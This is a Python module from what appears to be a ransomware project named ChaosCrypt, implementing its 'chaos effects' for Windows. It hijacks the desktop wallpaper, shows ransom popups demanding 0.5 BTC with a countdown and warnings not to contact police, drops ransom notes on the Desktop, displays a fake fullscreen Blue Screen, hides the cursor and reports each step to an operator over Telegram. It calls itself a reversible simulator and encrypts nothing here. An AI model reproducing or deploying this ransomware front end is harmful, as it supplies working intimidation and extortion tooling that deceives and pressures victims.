"""
ChaosCrypt Chaos Effects — Visual Effects Panel
=================================================
  1.  Wallpaper Hijack      — зміна шпалер на infected_wall.jpg
  2.  Wallpaper Restore     — відновлення оригінальних шпалер
  3.  Cursor Chaos          — ховає/дрижить курсор
  4.  QR Popup              — вікно з QR-кодом ключа
  5.  Ransom Popup          — вікно вимагач�� з таймером
  6.  Console Terror        — ASCII-арт + кольори консолі
  7.  Desktop Flood         — записки вимагача на робочий стіл
  8.  Desktop Cleanup       — прибирання записок
  9.  Fake BSOD             — повноекранний "синій екран смерті"
  10. Matrix Rain           — "Matrix" символи в консолі
  11. Window Shaker         — трясе вікна (Tkinter)
  12. Fake Progress Bar     — "Encrypting files..." прогрес-бар
  13. Glitch Text           — глітч-текст у консолі
  14. Screen Flash          — блимання екрану
  15. Audio Beep            — системний біп
  16. Infection Photo TG    — шле фото зараження в TG
  17. Full Pipeline         — всі ефекти послідовно
  18. Full Cleanup          — повне відновлення

LogBook phase: "chaos"
SAFE_MODE: всі ефекти reversible
"""

import os
import sys
import time
import json
import shutil
import random
import string
import argparse
import datetime
import ctypes
import threading

current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
if parent_dir not in sys.path:
    sys.path.append(parent_dir)

from chaoscrypt.settings import (
    ROOT_DIR, LOG_DIR, ASSETS_DIR, SAFE_MODE,
    SHOW_TARGET_DIR, STEALTH_TARGET_DIR,
    RANSOM_NOTE_NAME, RANSOM_QR_NAME,
    IMG_LOGO_SYSTEM, IMG_ICO_NAME
)
from chaoscrypt.logbook import LogBook

try:
    from chaoscrypt.telegram_notify import send_message, send_photo
except ImportError:
    send_message = None
    send_photo = None

CHAOS_PHASE = "chaos"
INFECTED_WALLPAPER = "infected_wall.jpg"
ORIGINAL_WALLPAPER_BACKUP = os.path.join(LOG_DIR, "original_wallpaper_path.txt")
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")

SPI_SETDESKWALLPAPER = 0x0014
SPI_GETDESKWALLPAPER = 0x0073
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02

RANSOM_ASCII = r"""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║      ██████╗██╗  ██╗ █████╗  ██████╗ ███████╗                    ║
║     ██╔════╝██║  ██║██╔══██╗██╔═══██╗██╔════╝                    ║
║     ██║     ███████║███████║██║   ██║███████╗                    ║
║     ██║     ██╔══██║██╔══██║██║   ██║╚════██║                    ║
║     ╚██████╗██║  ██║██║  ██║╚██████╔╝███████║                    ║
║      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                    ║
║                                                                  ║
║              💀 YOUR FILES HAVE BEEN ENCRYPTED 💀                ║
║                                                                  ║
║     All your documents, photos, and databases                    ║
║     have been locked with military-grade encryption.             ║
║                                                                  ║
║     🔑 To restore your files:                                    ║
║        1. Scan the QR code on your desktop                       ║
║        2. Follow the payment instructions                        ║
║        3. Receive your decryption key                            ║
║                                                                  ║
║     ⏰ Time remaining: 48:00:00                                  ║
║     ⚠️  DO NOT restart your computer                             ║
║     ⚠️  DO NOT try to decrypt manually                           ║
║                                                                  ║
║                      [ ChaosCrypt v3.0 ]                         ║
╚══════════════════════════════════════════════════════════════════╝
"""

SKULL_MINI = r"""
       ░░░░░░░░░░░░
      ░░░░░░░░░░░░░░
    ░░░████░░░░████░░░
    ░░░████░░░░████░░░
     ░░░░░░░▀▀░░░░░░░
      ░░░░▄████▄░░░░
       ░░░░░░░░░░░░
         ░░░░░░░░
"""

BSOD_TEXT = """



                         :(

                         Your PC ran into a problem and needs to restart.
                         We're just collecting some error info, and then we'll
                         restart for you.

                         {pct}% complete


                         Stop code: CHAOSCRYPT_ENCRYPTION_DETECTED
                         What failed: malware_payload.sys


                         For more information about this issue and possible fixes,
                         visit https://windows.com/stopcode

                         If you call a support person, give them this info:
                         Session: {session}
"""


class ChaosEffects:
    """Visual ransomware effects simulator."""

    def __init__(self):
        self.logger = LogBook(phase=CHAOS_PHASE)
        self.is_windows = sys.platform == 'win32'
        self.original_wallpaper = None
        self.session_id = ''.join(random.choices(string.hexdigits[:16], k=8))
        print(f"[CHAOS] Effects engine initialized. Session: {self.session_id}")
        self.logger.log_event("info", "Chaos Effects engine started", metadata={
            "platform": sys.platform, "safe_mode": SAFE_MODE,
            "is_windows": self.is_windows, "session": self.session_id
        })

    # ═══════════════════════════════════════════════
    # 1. WALLPAPER HIJACK
    # ═══════════════════════════════════════════════
    def _get_current_wallpaper(self):
        if not self.is_windows:
            return None
        try:
            buf = ctypes.create_unicode_buffer(512)
            ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, len(buf), buf, 0)
            return buf.value
        except Exception:
            return None

    def _set_wallpaper(self, path):
        if not self.is_windows:
            print("[CHAOS] Wallpaper: Windows only. Skip.")
            return False
        try:
            return bool(ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
            ))
        except Exception as e:
            print(f"[CHAOS] Wallpaper set failed: {e}")
            return False

    def wallpaper_hijack(self):
        print("[CHAOS] ─── Wallpaper Hijack ───")
        infected_path = os.path.join(ASSETS_DIR, INFECTED_WALLPAPER)
        if not os.path.exists(infected_path) or os.path.getsize(infected_path) == 0:
            print(f"[CHAOS] ⚠️ {INFECTED_WALLPAPER} missing or empty!")
            self.logger.log_event("error", "Infected wallpaper missing", metadata={"path": infected_path})
            return False

        self.original_wallpaper = self._get_current_wallpaper()
        if self.original_wallpaper:
            os.makedirs(LOG_DIR, exist_ok=True)
            with open(ORIGINAL_WALLPAPER_BACKUP, 'w', encoding='utf-8') as f:
                f.write(self.original_wallpaper)

        temp_wall = os.path.join(LOG_DIR, "current_infected_wall.jpg")
        try:
            shutil.copy2(infected_path, temp_wall)
        except Exception:
            temp_wall = infected_path

        ok = self._set_wallpaper(os.path.abspath(temp_wall))
        self.logger.log_event("chaos", "Wallpaper hijacked", metadata={
            "original": self.original_wallpaper or "unknown",
            "infected": os.path.abspath(temp_wall), "success": ok
        })
        if ok:
            print("[CHAOS] 💀 Wallpaper changed!")
        if send_message:
            send_message("🖥️ <b>Wallpaper Hijacked!</b>",
                         parse_mode="HTML", async_mode=False)
        return ok

    def wallpaper_restore(self):
        print("[CHAOS] ─── Wallpaper Restore ───")
        restored_path = None
        if os.path.exists(ORIGINAL_WALLPAPER_BACKUP):
            with open(ORIGINAL_WALLPAPER_BACKUP, 'r', encoding='utf-8') as f:
                restored_path = f.read().strip()
        if restored_path and os.path.exists(restored_path):
            ok = self._set_wallpaper(restored_path)
        else:
            ok = self._set_wallpaper("")
        print("[CHAOS] ✅ Wallpaper restored.")
        self.logger.log_event("remediation", "Wallpaper restored")
        return ok

    # ═══════════════════════════════════════════════
    # 2. CURSOR CHAOS
    # ═══════════════════════════════════════════════
    def cursor_chaos(self, duration=4):
        print(f"[CHAOS] ─── Cursor Chaos ({duration}s) ───")
        if not self.is_windows:
            print("[CHAOS] Windows only. Skip.")
            return
        try:
            ctypes.windll.user32.ShowCursor(False)
            self.logger.log_event("chaos", "Cursor hidden", metadata={"duration": duration})
            print(f"[CHAOS] 🖱️ Cursor hidden for {duration}s...")
            time.sleep(duration)
            ctypes.windll.user32.ShowCursor(True)
            print("[CHAOS] ✅ Cursor restored.")
        except Exception as e:
            print(f"[CHAOS] Cursor error: {e}")
            try:
                ctypes.windll.user32.ShowCursor(True)
            except Exception:
                pass

    # ═══════════════════════════════════════════════
    # 3. QR POPUP
    # ═══════════════════════════════════════════════
    def qr_popup(self, key_text=None, duration=8):
        print("[CHAOS] ─── QR Popup ───")
        qr_path = os.path.join(LOG_DIR, RANSOM_QR_NAME)
        if not os.path.exists(qr_path) or os.path.getsize(qr_path) == 0:
            qr_path = os.path.join(ASSETS_DIR, "payment_qr.png")
        if not os.path.exists(qr_path) or os.path.getsize(qr_path) == 0:
            print("[CHAOS] No QR image. Skip.")
            return

        try:
            import tkinter as tk
            from PIL import Image, ImageTk
        except ImportError:
            print("[CHAOS] tkinter/Pillow missing. Skip.")
            return

        self.logger.log_event("chaos", "QR popup shown", metadata={"duration": duration})
        try:
            root = tk.Tk()
            root.title("💀 ChaosCrypt — Payment Required")
            root.configure(bg='black')
            root.attributes('-topmost', True)
            root.resizable(False, False)
            ico = os.path.join(ASSETS_DIR, IMG_ICO_NAME)
            if os.path.exists(ico):
                try: root.iconbitmap(ico)
                except: pass

            tk.Label(root, text="💀 YOUR FILES ARE ENCRYPTED 💀",
                     font=("Consolas", 16, "bold"), fg="red", bg="black").pack(pady=10)
            img = Image.open(qr_path).resize((300, 300), Image.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            lbl = tk.Label(root, image=photo, bg="black")
            lbl.image = photo
            lbl.pack(pady=5)
            tk.Label(root, text=key_text or "Scan QR for payment instructions",
                     font=("Consolas", 10), fg="lime", bg="black").pack(pady=5)
            cv = tk.StringVar(value=f"Window closes in {duration}s...")
            tk.Label(root, textvariable=cv, font=("Consolas", 9), fg="yellow", bg="black").pack(pady=5)

            def _cd(r):
                if r <= 0: root.destroy(); return
                cv.set(f"Window closes in {r}s...")
                root.after(1000, _cd, r - 1)
            root.after(100, _cd, duration)
            root.update_idletasks()
            x = (root.winfo_screenwidth() // 2) - (root.winfo_width() // 2)
            y = (root.winfo_screenheight() // 2) - (root.winfo_height() // 2)
            root.geometry(f"+{x}+{y}")
            root.mainloop()
            print("[CHAOS] QR popup closed.")
        except Exception as e:
            print(f"[CHAOS] QR popup error: {e}")

    # ═══════════════════════════════════════════════
    # 4. RANSOM POPUP
    # ═══════════════════════════════════════════════
    def ransom_popup(self, duration=10):
        print("[CHAOS] ─── Ransom Popup ───")
        try:
            import tkinter as tk
            from PIL import Image, ImageTk
        except ImportError:
            print("[CHAOS] tkinter/Pillow missing. Skip.")
            return
        self.logger.log_event("chaos", "Ransom popup shown", metadata={"duration": duration})
        try:
            root = tk.Tk()
            root.title("⚠️ ChaosCrypt Ransomware")
            root.configure(bg='#1a0000')
            root.attributes('-topmost', True)
            root.geometry("660x500")
            root.resizable(False, False)
            ico = os.path.join(ASSETS_DIR, IMG_ICO_NAME)
            if os.path.exists(ico):
                try: root.iconbitmap(ico)
                except: pass

            logo_path = os.path.join(ASSETS_DIR, IMG_LOGO_SYSTEM)
            if os.path.exists(logo_path):
                try:
                    li = Image.open(logo_path).resize((80, 80), Image.LANCZOS)
                    lp = ImageTk.PhotoImage(li)
                    ll = tk.Label(root, image=lp, bg='#1a0000')
                    ll.image = lp
                    ll.pack(pady=(15, 5))
                except: pass

            tk.Label(root, text="💀 CHAOSCRYPT RANSOMWARE 💀",
                     font=("Consolas", 18, "bold"), fg="#ff3333", bg="#1a0000").pack(pady=5)
            tk.Label(root, text=(
                "All your files have been encrypted with\n"
                "military-grade XOR/AES encryption.\n\n"
                "Your documents, photos, databases are LOCKED.\n\n"
                "To restore access:\n"
                "  1. Scan the QR code\n"
                "  2. Send 0.5 BTC to the wallet address\n"
                "  3. Receive decryption key via Telegram\n\n"
                "⏰ You have 48 hours before keys are destroyed.\n"
                "⚠️ DO NOT contact law enforcement.\n"
                "⚠️ DO NOT attempt manual decryption."
            ), font=("Consolas", 11), fg="#ffcccc", bg="#1a0000", justify="left").pack(pady=10, padx=20)

            tv = tk.StringVar(value="⏰ 47:59:59")
            tk.Label(root, textvariable=tv, font=("Consolas", 22, "bold"),
                     fg="red", bg="#1a0000").pack(pady=5)
            clv = tk.StringVar(value="")
            tk.Label(root, textvariable=clv, font=("Consolas", 9),
                     fg="#333333", bg="#1a0000").pack(pady=3)

            fs = 47 * 3600 + 59 * 60 + 59
            def _t(r, f):
                if r <= 0: root.destroy(); return
                h, rm = divmod(f, 3600); m, s = divmod(rm, 60)
                tv.set(f"⏰ {h:02d}:{m:02d}:{s:02d}")
                root.after(1000, _t, r - 1, f - 1)
            root.after(100, _t, duration, fs)
            root.update_idletasks()
            x = (root.winfo_screenwidth() // 2) - 330
            y = (root.winfo_screenheight() // 2) - 250
            root.geometry(f"+{x}+{y}")
            root.mainloop()
            print("[CHAOS] Ransom popup closed.")
        except Exception as e:
            print(f"[CHAOS] Ransom popup error: {e}")

    # ═══════════════════════════════════════════════
    # 5. CONSOLE TERROR
    # ═══════════════════════════════════════════════
    def console_terror(self):
        print("[CHAOS] ─── Console Terror ───")
        if self.is_windows:
            try: os.system("color 4F")
            except: pass
        print(RANSOM_ASCII)
        time.sleep(2)
        self.logger.log_event("chaos", "Console terror displayed")
        if self.is_windows:
            try: os.system("color 07")
            except: pass

    # ═══════════════════════════════════════════════
    # 6. DESKTOP FLOOD
    # ═══════════════════════════════════════════════
    def desktop_flood(self, count=5):
        print(f"[CHAOS] ─── Desktop Flood ({count} notes) ───")
        if not os.path.exists(DESKTOP_PATH):
            print(f"[CHAOS] Desktop not found: {DESKTOP_PATH}")
            return
        dropped = []
        for i in range(1, count + 1):
            np = os.path.join(DESKTOP_PATH, f"!!!_ENCRYPTED_{i:02d}_!!!.txt")
            try:
                with open(np, 'w', encoding='utf-8') as f:
                    f.write("💀 YOUR FILES HAVE BEEN ENCRYPTED BY CHAOSCRYPT 💀\n\n")
                    f.write(f"Note #{i}/{count}\nTimestamp: {datetime.datetime.now().isoformat()}\n\n")
                    f.write("All your documents, photos, and databases are locked.\n")
                    f.write("Scan the QR code to begin the payment process.\n\n")
                    f.write("DO NOT attempt to restore files manually.\n")
                    f.write("DO NOT contact law enforcement.\n")
                    f.write("You have 48 hours.\n")
                dropped.append(np)
            except: pass

        for src_name, dst_name in [
            (os.path.join(LOG_DIR, RANSOM_QR_NAME), RANSOM_QR_NAME),
            (os.path.join(ASSETS_DIR, "payment_qr.png"), RANSOM_QR_NAME),
            (os.path.join(ASSETS_DIR, IMG_LOGO_SYSTEM), "CHAOSCRYPT_LOGO.png"),
        ]:
            if os.path.exists(src_name) and os.path.getsize(src_name) > 0:
                try:
                    shutil.copy2(src_name, os.path.join(DESKTOP_PATH, dst_name))
                    dropped.append(dst_name)
                except: pass

        self.logger.log_event("chaos", f"Desktop flood: {len(dropped)} files", metadata={"count": len(dropped)})
        print(f"[CHAOS] 💀 {len(dropped)} files dropped to Desktop.")
        if send_message:
            send_message(f"📝 <b>Desktop Flood:</b> {len(dropped)} ransom notes dropped",
                         parse_mode="HTML", async_mode=True)

    def desktop_cleanup(self):
        print("[CHAOS] ─── Desktop Cleanup ───")
        if not os.path.exists(DESKTOP_PATH): return
        removed = 0
        for f in os.listdir(DESKTOP_PATH):
            if (f.startswith("!!!_ENCRYPTED_") or f == RANSOM_QR_NAME
                    or f == "CHAOSCRYPT_LOGO.png" or f == RANSOM_NOTE_NAME
                    or f.startswith("BSOD_CHAOSCRYPT")):
                try: os.remove(os.path.join(DESKTOP_PATH, f)); removed += 1
                except: pass
        print(f"[CHAOS] ✅ Cleaned {removed} files from Desktop.")
        self.logger.log_event("remediation", f"Desktop cleaned: {removed} files")

    # ═══════════════════════════════════════════════
    # 7. FAKE BSOD
    # ═══════════════════════════════════════════════
    def fake_bsod(self, duration=8):
        print("[CHAOS] ─── Fake BSOD ───")
        try:
            import tkinter as tk
        except ImportError:
            print("[CHAOS] tkinter missing. Skip.")
            return
        self.logger.log_event("chaos", "Fake BSOD shown", metadata={"duration": duration})
        try:
            root = tk.Tk()
            root.configure(bg='#0078D7')
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.overrideredirect(True)

            text = BSOD_TEXT.format(pct=0, session=self.session_id)
            label = tk.Label(root, text=text, font=("Segoe UI", 14),
                             fg="white", bg="#0078D7", justify="left")
            label.pack(expand=True)

            def _progress(step, total):
                if step > total:
                    root.destroy()
                    return
                pct = int((step / total) * 100)
                t = BSOD_TEXT.format(pct=pct, session=self.session_id)
                label.config(text=t)
                root.after(int(duration * 1000 / total), _progress, step + 1, total)

            root.after(500, _progress, 0, 20)
            root.bind('<Escape>', lambda e: root.destroy())
            root.mainloop()
            print("[CHAOS] BSOD closed.")
        except Exception as e:
            print(f"[CHAOS] BSOD error: {e}")

    # ═══════════════════════════════════════════════
    # 8. MATRIX RAIN
    # ═══════════════════════════════════════════════
    def matrix_rain(self, duration=5, width=80):
        print("[CHAOS] ─── Matrix Rain ───")
        self.logger.log_event("chaos", "Matrix rain effect", metadata={"duration": duration})
        chars = "ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ012345789ABCDEF$@#&"
        if self.is_windows:
            try: os.system("color 0A")
            except: pass
        end_time = time.time() + duration
        try:
            while time.time() < end_time:
                line = ''.join(random.choice(chars) for _ in range(width))
                print(line)
                time.sleep(0.05)
        except KeyboardInterrupt:
            pass
        if self.is_windows:
            try: os.system("color 07")
            except: pass
        print("[CHAOS] Matrix rain done.")

    # ═══════════════════════════════════════════════
    # 9. FAKE PROGRESS BAR
    # ═══════════════════════════════════════════════
    def fake_encrypt_progress(self, total_files=47, duration=6):
        print("[CHAOS] ─── Fake Encryption Progress ───")
        self.logger.log_event("chaos", "Fake encrypt progress", metadata={"files": total_files})
        fake_dirs = [
            "C:\\Users\\victim\\Documents",
            "C:\\Users\\victim\\Pictures",
            "C:\\Users\\victim\\Desktop",
            "C:\\Users\\victim\\Downloads",
            "D:\\Backups\\Important",
            "C:\\Program Files\\Office",
        ]
        fake_exts = [".docx", ".xlsx", ".pdf", ".jpg", ".png", ".zip", ".pptx", ".txt", ".db"]
        step_time = duration / total_files

        if self.is_windows:
            try: os.system("color 0C")
            except: pass

        print("\n  ⚡ CHAOSCRYPT ENCRYPTION ENGINE v3.0 ⚡\n")
        for i in range(1, total_files + 1):
            d = random.choice(fake_dirs)
            fname = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
            ext = random.choice(fake_exts)
            bar_len = 30
            filled = int(bar_len * i / total_files)
            bar = "█" * filled + "░" * (bar_len - filled)
            pct = int(100 * i / total_files)
            sys.stdout.write(f"\r  [{bar}] {pct:3d}% | Encrypting: {d}\\{fname}{ext}   ")
            sys.stdout.flush()
            time.sleep(step_time)

        print(f"\n\n  ✅ {total_files} files encrypted successfully.\n")
        print("  🔑 Key transmitted to C2 server.")
        print("  💰 Payment portal: https://chaoscrypt-pay.onion/wallet\n")

        if self.is_windows:
            try: os.system("color 07")
            except: pass

    # ═══════════════════════════════════════════════
    # 10. GLITCH TEXT
    # ═══════════════════════════════════════════════
    def glitch_text(self, text="YOUR FILES ARE ENCRYPTED", iterations=15):
        print("[CHAOS] ─── Glitch Text ───")
        self.logger.log_event("chaos", "Glitch text effect")
        glitch_chars = "!@#$%^&*()_+-=[]{}|;:',.<>?/~`░▒▓█▀▄"
        for _ in range(iterations):
            glitched = ""
            for c in text:
                if random.random() < 0.3:
                    glitched += random.choice(glitch_chars)
                else:
                    glitched += c
            sys.stdout.write(f"\r  💀 {glitched}  ")
            sys.stdout.flush()
            time.sleep(0.15)
        sys.stdout.write(f"\r  💀 {text}                    \n")
        sys.stdout.flush()

    # ═══════════════════════════════════════════════
    # 11. SCREEN FLASH
    # ═══════════════════════════════════════════════
    def screen_flash(self, flashes=5, duration=0.15):
        print(f"[CHAOS] ─── Screen Flash ({flashes}x) ───")
        try:
            import tkinter as tk
        except ImportError:
            print("[CHAOS] tkinter missing. Skip.")
            return
        self.logger.log_event("chaos", "Screen flash", metadata={"flashes": flashes})
        try:
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.overrideredirect(True)
            colors = ["red", "black", "white", "red", "black"]

            def _flash(i):
                if i >= flashes * 2:
                    root.destroy()
                    return
                root.configure(bg=colors[i % len(colors)])
                root.after(int(duration * 1000), _flash, i + 1)

            root.after(100, _flash, 0)
            root.mainloop()
            print("[CHAOS] Flash done.")
        except Exception as e:
            print(f"[CHAOS] Flash error: {e}")

    # ═══════════════════════════════════════════════
    # 12. WINDOW SHAKER
    # ═══════════════════════════════════════════════
    def window_shaker(self, duration=3, intensity=15):
        print(f"[CHAOS] ─── Window Shaker ({duration}s) ───")
        try:
            import tkinter as tk
        except ImportError:
            return
        self.logger.log_event("chaos", "Window shaker", metadata={"duration": duration})
        try:
            root = tk.Tk()
            root.title("⚠️ SYSTEM ERROR")
            root.geometry("400x200")
            root.attributes('-topmost', True)
            root.configure(bg='black')
            tk.Label(root, text="⚠️ CRITICAL SYSTEM ERROR ⚠️\n\nFiles are being encrypted...\nDo NOT close this window!",
                     font=("Consolas", 12, "bold"), fg="red", bg="black").pack(expand=True)

            base_x = root.winfo_screenwidth() // 2 - 200
            base_y = root.winfo_screenheight() // 2 - 100
            end = time.time() + duration

            def _shake():
                if time.time() > end:
                    root.destroy()
                    return
                dx = random.randint(-intensity, intensity)
                dy = random.randint(-intensity, intensity)
                root.geometry(f"+{base_x + dx}+{base_y + dy}")
                root.after(50, _shake)

            root.after(100, _shake)
            root.mainloop()
            print("[CHAOS] Shaker done.")
        except Exception as e:
            print(f"[CHAOS] Shaker error: {e}")

    # ═══════════════════════════════════════════════
    # 13. AUDIO BEEP
    # ═══════════════════════════════════════════════
    def audio_beep(self, count=3):
        print(f"[CHAOS] ─── Audio Beep ({count}x) ───")
        self.logger.log_event("chaos", "Audio beep", metadata={"count": count})
        for i in range(count):
            if self.is_windows:
                try:
                    import winsound
                    freq = random.choice([800, 1000, 1200, 1500])
                    winsound.Beep(freq, 300)
                except Exception:
                    print('\a', end='')
            else:
                print('\a', end='')
            time.sleep(0.4)

    # ═══════════════════════════════════════════════
    # 14. SKULL PARADE
    # ═══════════════════════════════════════════════
    def skull_parade(self, count=3):
        print("[CHAOS] ─── Skull Parade ───")
        self.logger.log_event("chaos", "Skull parade")
        for i in range(count):
            if self.is_windows:
                try: os.system(f"color {random.choice(['0C', '0E', '0A', '04', '0D'])}")
                except: pass
            print(SKULL_MINI)
            print(f"     VICTIM #{i+1} IDENTIFIED")
            time.sleep(0.8)
        if self.is_windows:
            try: os.system("color 07")
            except: pass

    # ═══════════════════════════════════════════════
    # 15. FAKE FILE LISTING
    # ═══════════════════════════════════════════════
    def fake_file_listing(self, count=20):
        print("[CHAOS] ─── Fake File Scanner ───")
        self.logger.log_event("chaos", "Fake file listing")
        dirs = ["Documents", "Pictures", "Desktop", "Downloads", "Videos", "Music",
                "OneDrive", "Dropbox", "Backups", "Database"]
        exts = [".docx", ".xlsx", ".pdf", ".jpg", ".png", ".mp4", ".sql", ".bak", ".zip", ".pptx"]
        print("\n  🔍 SCANNING FILESYSTEM FOR TARGETS...\n")
        for i in range(count):
            d = random.choice(dirs)
            fname = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 15)))
            ext = random.choice(exts)
            size = random.randint(1, 50000)
            status = random.choice(["LOCKED ✅", "LOCKED ✅", "LOCKED ✅", "SKIPPED ⏭️"])
            print(f"  [{i+1:3d}/{count}] C:\\Users\\victim\\{d}\\{fname}{ext} ({size}KB) — {status}")
            time.sleep(0.1)
        print(f"\n  📊 SCAN COMPLETE: {count} files targeted.\n")

    # ═══════════════════════════════════════════════
    # 16. TG INFECTION PHOTO
    # ═══════════════════════════════════════════════
    def send_infection_photo(self):
        logo = os.path.join(ASSETS_DIR, IMG_LOGO_SYSTEM)
        if send_photo and os.path.exists(logo):
            send_photo(logo,
                       caption="💀 <b>ChaosCrypt: Visual payload deployed</b>\n"
                               "<code>Wallpaper | Desktop | Popups | BSOD</code>",
                       parse_mode="HTML", async_mode=False)

    # ═══════════════════════════════════════════════
    # 17. FULL PIPELINE
    # ═══════════════════════════════════════════════
    def run_full_effects(self):
        print("\n" + "=" * 60)
        print("*** ChaosCrypt Chaos Effects — Full Pipeline ***")
        print("=" * 60)
        self.logger.log_event("info", "Full effects pipeline started", metadata={"safe_mode": SAFE_MODE})

        if send_message:
            send_message("🎭 <b>Chaos Effects: Deploying visual payload...</b>",
                         parse_mode="HTML", async_mode=False)

        print(); self.console_terror(); time.sleep(1)
        print(); self.glitch_text(); time.sleep(1)
        print(); self.matrix_rain(duration=3, width=60); time.sleep(1)
        print(); self.skull_parade(count=2); time.sleep(1)
        print(); self.fake_file_listing(count=15); time.sleep(1)
        print(); self.fake_encrypt_progress(total_files=30, duration=4); time.sleep(1)
        print(); self.audio_beep(count=3); time.sleep(1)
        print(); self.wallpaper_hijack(); time.sleep(2)
        print(); self.desktop_flood(count=5); time.sleep(1)
        print(); self.screen_flash(flashes=4); time.sleep(1)
        print(); self.window_shaker(duration=2); time.sleep(1)
        print(); self.fake_bsod(duration=6); time.sleep(1)
        print(); self.ransom_popup(duration=8); time.sleep(1)
        print(); self.qr_popup(duration=6); time.sleep(1)
        print(); self.cursor_chaos(duration=3); time.sleep(1)
        self.send_infection_photo()

        self.logger.log_event("finish", "Full effects pipeline complete")
        if send_message:
            send_message("✅ <b>Chaos Effects: Payload deployed</b>",
                         parse_mode="HTML", async_mode=False)
        print("\n" + "=" * 60)
        print("[CHAOS] All effects deployed.")
        print("=" * 60)
        self.logger.close()

    def run_full_cleanup(self):
        print("[CHAOS] ─── Full Cleanup ───")
        self.wallpaper_restore()
        self.desktop_cleanup()
        self.logger.log_event("finish", "Full cleanup done")
        if send_message:
            send_message("🧹 <b>Chaos Effects cleaned up</b>", parse_mode="HTML", async_mode=False)
        self.logger.close()
        print("[CHAOS] ✅ All effects reversed.")


def main():
    parser = argparse.ArgumentParser(description="ChaosCrypt Chaos Effects")
    parser.add_argument('--wallpaper', action='store_true', help="Wallpaper hijack")
    parser.add_argument('--restore', action='store_true', help="Restore wallpaper")
    parser.add_argument('--popup', action='store_true', help="Ransom popup")
    parser.add_argument('--qr', action='store_true', help="QR popup")
    parser.add_argument('--cursor', action='store_true', help="Cursor chaos")
    parser.add_argument('--console', action='store_true', help="Console ASCII")
    parser.add_argument('--flood', action='store_true', help="Desktop flood")
    parser.add_argument('--bsod', action='store_true', help="Fake BSOD")
    parser.add_argument('--matrix', action='store_true', help="Matrix rain")
    parser.add_argument('--progress', action='store_true', help="Fake encrypt progress")
    parser.add_argument('--glitch', action='store_true', help="Glitch text")
    parser.add_argument('--flash', action='store_true', help="Screen flash")
    parser.add_argument('--shake', action='store_true', help="Window shaker")
    parser.add_argument('--beep', action='store_true', help="Audio beep")
    parser.add_argument('--skulls', action='store_true', help="Skull parade")
    parser.add_argument('--scan', action='store_true', help="Fake file scanner")
    parser.add_argument('--cleanup', action='store_true', help="Full cleanup")
    args = parser.parse_args()

    fx = ChaosEffects()
    actions = {
        'wallpaper': fx.wallpaper_hijack, 'restore': fx.wallpaper_restore,
        'popup': fx.ransom_popup, 'qr': fx.qr_popup, 'cursor': fx.cursor_chaos,
        'console': fx.console_terror, 'flood': fx.desktop_flood, 'bsod': fx.fake_bsod,
        'matrix': fx.matrix_rain, 'progress': fx.fake_encrypt_progress,
        'glitch': fx.glitch_text, 'flash': fx.screen_flash, 'shake': fx.window_shaker,
        'beep': fx.audio_beep, 'skulls': fx.skull_parade, 'scan': fx.fake_file_listing,
        'cleanup': fx.run_full_cleanup,
    }
    for name, func in actions.items():
        if getattr(args, name, False):
            func()
            return
    fx.run_full_effects()


if __name__ == "__main__":
    main()